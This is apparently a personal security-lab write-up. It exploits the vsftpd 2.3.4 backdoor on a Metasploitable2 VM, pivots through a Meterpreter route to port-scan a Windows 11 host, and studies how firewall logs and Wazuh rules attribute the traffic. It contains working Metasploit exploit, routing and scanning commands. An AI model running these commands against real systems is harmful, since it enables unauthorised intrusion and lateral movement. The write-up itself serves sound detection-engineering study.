# Exploitation, Pivoting, and Log Attribution: Metasploitable2 → Windows

**Lab environment:** Kali Linux (attacker) → Metasploitable2 (compromised beachhead) →
Windows 11 (secondary target, Wazuh agent) → Ubuntu (Wazuh manager)
**Date:** 25/09/2026
**MITRE ATT&CK mapping:** T1046 — Network Service Discovery, T1210-adjacent (lateral movement via pivot)

## Objective

Go beyond a single-hop attack: compromise a deliberately vulnerable Linux host, then use
that foothold to pivot toward a second, harder target — and confirm what the second
target's logs actually attribute the resulting traffic to.

## Environment Setup

- **Attacker:** Kali Linux, IP `192.168.163.7`
- **Beachhead / compromised host:** Metasploitable2, IP `192.168.163.6`
- **Secondary target:** Windows 11, IP `192.168.163.4` (same host used in Exercise 1,
  Wazuh agent + Sysmon already configured)
- **SIEM:** Ubuntu, Wazuh manager + dashboard

Metasploitable2 was added as a 4th VM specifically for this exercise, since the existing
Windows target — already hardened from Exercise 1's investigation — has no easy remote
exploit available. Metasploitable2 provided a realistic, well-documented entry point,
mirroring how a real attacker often lands on the weakest box in a network first and
pivots from there rather than attacking the hardest target directly.

## Step 1 — Reconnaissance

```bash
sudo nmap -sV -p- 192.168.163.6
```

Confirmed a wide-open attack surface (FTP, Samba, RPC services, etc.) — a deliberate
contrast to how locked-down the Windows target was in Exercise 1.

## Step 2 — Initial Exploitation

Targeted the well-known vsftpd 2.3.4 backdoor:

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.163.6
set LHOST 192.168.163.7
run
```

**Result:** root-level session on Metasploitable2.

**Dead end — session instability:** the backdoor payload defaults to a bare Unix command
shell (`cmd/unix/interact`), not Meterpreter. This raw shell proved unreliable:
inconsistent input/output through both Metasploit's `shell` wrapper and direct `nc`
connections to the backdoor's listener (port 6200), and it did not survive cleanly across
troubleshooting. A VM reboot was required to clear stale listener state before re-running
the exploit. On the second attempt, Metasploit returned a full **Meterpreter** session
instead — notably more stable, and this is the session used for the remainder of the
exercise.

**Lesson:** not all "successful" exploits produce equally robust footholds. A payload
choice matters as much as the vulnerability itself when planning further action from a
compromised host.

**Second lesson (persistence characteristic):** the vsftpd backdoor's listener (port 6200)
remained open and reusable after the initial trigger, without needing to re-exploit —
worth noting as a realistic illustration of why a single successful exploit can leave a
long-lived door open, not just a one-time win.

## Step 3 — Setting Up the Pivot

```
sessions -i 1
background
route add 192.168.163.4/32 1
route print
```

This routes any traffic Metasploit sends to `192.168.163.4` through session 1
(Metasploitable2) rather than directly from Kali's own interface.

**Important limitation confirmed during this exercise:** this routing only applies to
modules run **through Metasploit itself** (its own scanner/exploit modules). Ordinary
Kali-side tools (`ping`, `nmap`) do **not** respect this route — they still egress directly
from Kali's own interface, unaffected by the pivot.

## Step 4 — Verifying the Pivot Actually Works

A single, narrow test settled this unambiguously:

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.163.4
set PORTS 445
set VERBOSE true
run
```

**Result:** `192.168.163.4:445 - TCP OPEN` — and critically, the corresponding entry in
Windows' `pfirewall.log` recorded the source IP as **`192.168.163.6` (Metasploitable2)**,
not Kali's IP, despite the command being typed and executed entirely on Kali.

```
2026-09-25 01:02:39 ALLOW TCP 192.168.163.6 192.168.163.4 56875 445 0 ...
```

**This is the core finding of the exercise:** from the target's perspective, the traffic's
origin is whatever host it was last routed through — not the human operator's actual
machine. This is exactly the mechanic real attackers use to obscure their true position,
and the corresponding blue-team lesson is that **the source IP in a log is the last hop,
not necessarily the true attacker.**

## Step 5 — Scaling Up: Full Port Range Through the Pivot

```
set PORTS 1-1000
run
```

**Result:** scan completed, session survived. However, checking `pfirewall.log` for this
scan's timestamp window showed only **2 DROP entries** (ports 135, 139) plus the expected
445 ALLOW — nowhere near the ~998 expected for a full 1–1000 port sweep.

**This reproduces Exercise 1's firewall-log throttling finding, now confirmed to also
apply to pivoted traffic:** Windows Firewall's `pfirewall.log` silently drops log entries
under high write-burst load, regardless of whether the traffic originates directly from an
attacker or is routed through a compromised intermediate host. A fast scan is easier to
correlate in time (better for detection rules) but loses log entries to throttling; a
slow scan preserves logging completeness but spreads events too thin for a short
correlation window to catch. [See Exercise 1 write-up for the original discovery of this
trade-off.]

## Step 6 — Wazuh Detection Outcome

The custom scan-detection rule from Exercise 1 (`rule.id: 100011`) did **not** fire for
the pivoted scan, consistent with the low DROP-entry volume described above — there
simply weren't enough logged events within the correlation window to satisfy the
frequency threshold, even after it had already been loosened once during Exercise 1's
tuning.

**A separate, unrelated false-positive was observed repeatedly during this exercise**:
Wazuh's built-in noise-detection rule (`rule.id: 4151`, "Multiple Firewall drop events
from same source") and the custom rule `100011` both occasionally fired on the **host
machine's own IP** (`192.168.163.1`) due to routine SSDP/NetBIOS/LLMNR broadcast traffic
— not attacker activity. This reinforces the false-positive risk flagged as a follow-up
item in Exercise 1.

## Key Takeaways

1. **Payload/session type matters as much as the exploit itself.** A "successful" exploit
   can still leave you with a fragile foothold — Meterpreter sessions proved materially
   more stable than a raw interactive shell payload for sustained follow-on activity like
   pivoting.
2. **Pivoted attacks are attributed to the last hop, not the true source** — confirmed
   directly by comparing the logged source IP to where the command was actually typed.
   This is a fundamental blue-team caveat: an IP address in a log is a network fact, not
   proof of who the operator was.
3. **Host-based log throttling under burst load is a real, recurring limitation** — it
   constrained visibility identically whether the attack was direct (Exercise 1) or
   pivoted (this exercise). Any detection strategy relying solely on this log source has
   a real, demonstrated blind spot against fast scans.
4. **A working exploit can still leave a persistent access point** (the vsftpd backdoor's
   port 6200 remaining open) — a reminder that "the exploit is over" doesn't mean the door
   closed.

## Next Steps

- [✅] Re-attempt the full port range scan with `THREADS 1` (sequential) to test whether
      slowing the pivoted scan avoids the logging throttling issue, mirroring the `-T2`
      fix from Exercise 1
- [ ] Tune rule `100011` and/or `4151` to exclude the host machine's own IP and standard
      multicast/broadcast destinations, to reduce the recurring false positives
      encountered in both exercises
- [ ] Move to Exercise 3: Brute-Force / Credential Attack Detection Engineering
